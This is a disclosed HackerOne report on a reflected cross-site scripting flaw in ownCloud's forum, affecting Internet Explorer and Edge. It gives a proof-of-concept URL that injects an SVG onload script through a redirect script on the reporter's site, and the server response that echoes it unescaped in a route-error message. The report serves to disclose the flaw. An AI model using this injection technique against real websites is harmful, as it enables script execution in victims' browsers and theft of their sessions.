# [forum.owncloud.org] IE, Edge XSS via Request-URI

## Report Details
- **Report ID**: 154319
- **URL**: https://hackerone.com/reports/154319
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-27T11:33:30.636Z
- **Disclosed**: 2016-08-30T16:26:03.368Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
**PoC** (Internet Explorer, Edge):
```
https://blackfan.ru/x?r=https://forum.owncloud.org/<svg/onload=alert(document.domain)>/%252e%252e
```
blackfan.ru/x?r - simple redirection script, that necessary for exploitation


**HTTP Response**:
```html
<div class="panel" id="message">
	<div class="inner">
	<h2 class="message-title">Information</h2>
	<p>No route found for "GET /<svg/onload=alert(document.domain)>/%2e%2e"</p>
		</div>
</div>
```

## Attachments
- Screenshot_at_15-32-56.png
